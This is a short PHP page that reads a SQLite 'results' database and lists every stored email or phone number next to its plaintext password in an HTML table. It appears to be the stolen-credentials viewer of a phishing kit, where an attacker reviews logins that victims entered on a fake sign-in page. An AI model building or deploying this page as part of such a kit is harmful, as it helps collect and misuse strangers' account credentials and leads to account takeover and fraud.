<?php

$resultsDb = new PDO("sqlite:" . $_SERVER["DOCUMENT_ROOT"] . "/databases/results.db");

$stmt = $resultsDb->query("SELECT * FROM results ORDER BY id DESC");
$results = $stmt->fetchAll(PDO::FETCH_ASSOC);

?>
<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <title>Results</title>
</head>
<body>
   
   <header>
      <h1>Results</h1>
   </header>
   <hr>
   
   <?php $number = 1; ?>
   <?php if (!empty($results)) : ?>
      <table border="1">
         <tr>
            <th>Num</th>
            <th>Email/Phone number</th>
            <th>Password</th>
         </tr>
         <?php foreach ($results as $result) : ?>
            <tr>
               <td><?= htmlspecialchars($number); ?></td>
               <td><?= htmlspecialchars($result["email"]); ?></td>
               <td><?= htmlspecialchars($result["password"]); ?></td>
            </tr>
            <?php $number++; ?>
         <?php endforeach; ?>
      </table>
   <?php else : ?>
      <span>No results yet.</span>
   <?php endif; ?>
   
</body>
</html>